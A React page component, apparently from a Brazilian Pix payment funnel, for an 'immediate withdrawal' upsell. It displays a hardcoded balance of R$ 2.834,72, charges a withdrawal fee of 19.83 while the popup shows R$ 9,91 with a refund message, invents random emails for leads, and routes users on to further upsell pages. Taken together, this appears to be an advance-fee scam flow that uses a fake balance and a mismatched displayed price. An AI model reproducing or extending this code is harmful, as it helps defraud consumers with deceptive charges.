import { useState, useEffect, useCallback } from "react";
import { Link, useNavigate, useLocation } from "react-router-dom";
import { ArrowLeft, ArrowRight } from "lucide-react";
import FunnelUpsellSaqueImediato from "@/components/funnel/FunnelUpsellSaqueImediato";
import FunnelProcessingScreen from "@/components/funnel/FunnelProcessingScreen";
import { FunnelPixPopup } from "@/components/funnel";
import { supabase } from "@/integrations/supabase/client";
import { trackPurchasePixelOnce } from "@/lib/tiktokPixel";
import { usePaymentCheck } from "@/hooks/usePaymentCheck";
import { usePixGeneration } from "@/hooks/usePixGeneration";
import { useLeadData } from "@/hooks/useLeadData";
import { generateRandomEmail } from "@/lib/generateRandomEmail";

interface LocationState {
  pixKey?: string;
  pixKeyType?: string;
}

const FunnelUpsellSaqueImediatoPage = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const state = location.state as LocationState | null;

  const [showPixPopup, setShowPixPopup] = useState(false);
  const [pixCopied, setPixCopied] = useState(false);
  const [showProcessing, setShowProcessing] = useState(false);

  const leadPixKey = state?.pixKey || "";
  const leadPixKeyType = state?.pixKeyType || "E-mail";

  const { generatePix, isGenerating, pixData } = usePixGeneration();
  const { leadCpf, leadName } = useLeadData();

  const handlePaymentConfirmed = useCallback(async () => {
    console.log('SAQUE: Payment confirmed. Showing processing...');
    if (pixData?.transaction_id && pixData?.amount) {
      trackPurchasePixelOnce({
        transactionId: pixData.transaction_id,
        value: pixData.amount,
        contentId: 'upsell_saque_imediato',
      });
    }
    setShowPixPopup(false);
    setShowProcessing(true);
  }, [pixData]);

  const handleProcessingComplete = useCallback(() => {
    navigate('/funil/upsell-anti-erros', {
      state: { pixKey: leadPixKey, pixKeyType: leadPixKeyType },
    });
  }, [navigate, leadPixKey, leadPixKeyType]);

  const { isChecking, checkError, checkPayment } = usePaymentCheck({
    transactionId: pixData?.transaction_id,
    onPaymentConfirmed: handlePaymentConfirmed,
  });

  useEffect(() => {
    if (!showPixPopup || !pixData?.transaction_id) return;

    let cancelled = false;
    let didNavigate = false;

    const transactionId = pixData.transaction_id;
    const amount = pixData.amount;

    const goNext = async (source: string) => {
      if (didNavigate) return;
      didNavigate = true;
      console.log(`SAQUE: Payment confirmed (${source}). Showing processing...`);

      if (transactionId && amount) {
        trackPurchasePixelOnce({
          transactionId,
          value: amount,
          contentId: 'upsell_saque_imediato',
        });
      }

      setShowPixPopup(false);
      setShowProcessing(true);
    };

    const checkPaymentStatus = async (source: string) => {
      if (cancelled || didNavigate) return;
      try {
        const { data: apiResult, error: apiError } = await supabase.functions.invoke('check-payment', {
          body: { transaction_id: transactionId }
        });

        if (apiError) {
          console.warn('SAQUE: API check error:', source, apiError);
          return;
        }

        if (apiResult?.status === 'paid') {
          goNext(source);
        }
      } catch (err) {
        console.warn('SAQUE: Error checking payment:', source, err);
      }
    };

    checkPaymentStatus('initial');

    const interval = window.setInterval(() => checkPaymentStatus('poll'), 2500);

    const channel = supabase
      .channel(`payment-status-saque-${transactionId}`)
      .on('postgres_changes', {
        event: 'UPDATE',
        schema: 'public',
        table: 'pix_payments',
        filter: `transaction_id=eq.${transactionId}`
      }, (payload) => {
        if (payload.new?.status === 'paid' || payload.new?.status === 'approved') {
          checkPaymentStatus('realtime');
        }
      })
      .subscribe();

    return () => {
      cancelled = true;
      window.clearInterval(interval);
      supabase.removeChannel(channel);
    };
  }, [showPixPopup, pixData]);

  const handleGeneratePix = async () => {
    const emailToSend = leadPixKeyType === "E-mail" && leadPixKey
      ? leadPixKey
      : generateRandomEmail(leadName || undefined);

    const result = await generatePix({
      amount: 19.83,
      name: leadName || undefined,
      email: emailToSend,
      cpf: leadCpf || undefined,
      payment_type: 'upsell_saque_imediato',
    });

    if (result) {
      setShowPixPopup(true);
    }
  };

  const handleCopyPixCode = () => {
    if (pixData?.pix_code) {
      navigator.clipboard.writeText(pixData.pix_code);
      setPixCopied(true);
      setTimeout(() => setPixCopied(false), 2000);
    }
  };

  if (showProcessing) {
    return <FunnelProcessingScreen onComplete={handleProcessingComplete} />;
  }

  return (
    <div className="min-h-screen bg-[#FFF5F0]">
      <div className="fixed top-14 left-4 right-4 z-[90] flex justify-between">
        <Link
          to="/funil/upsell-anti-reversao"
          state={{ pixKey: leadPixKey, pixKeyType: leadPixKeyType }}
          className="flex items-center gap-1 text-white text-sm bg-black/30 px-3 py-1 rounded-full"
        >
          <ArrowLeft className="w-4 h-4" />
          Anterior
        </Link>
        <Link
          to="/funil/upsell-anti-erros"
          state={{ pixKey: leadPixKey, pixKeyType: leadPixKeyType }}
          className="flex items-center gap-1 text-white text-sm bg-black/30 px-3 py-1 rounded-full"
        >
          Próximo
          <ArrowRight className="w-4 h-4" />
        </Link>
      </div>
      <FunnelUpsellSaqueImediato
        balance="R$ 2.834,72"
        onGeneratePix={handleGeneratePix}
        isGenerating={isGenerating}
        leadCpf={leadCpf}
        leadName={leadName}
      />

      {showPixPopup && pixData && (
        <FunnelPixPopup
          pixData={pixData}
          onClose={() => setShowPixPopup(false)}
          onCopy={handleCopyPixCode}
          isCopied={pixCopied}
          title="Saque Imediato"
          amount="R$ 9,91"
          showRefundMessage={true}
          onManualCheck={checkPayment}
          isCheckingPayment={isChecking}
          checkError={checkError}
        />
      )}
    </div>
  );
};

export default FunnelUpsellSaqueImediatoPage;
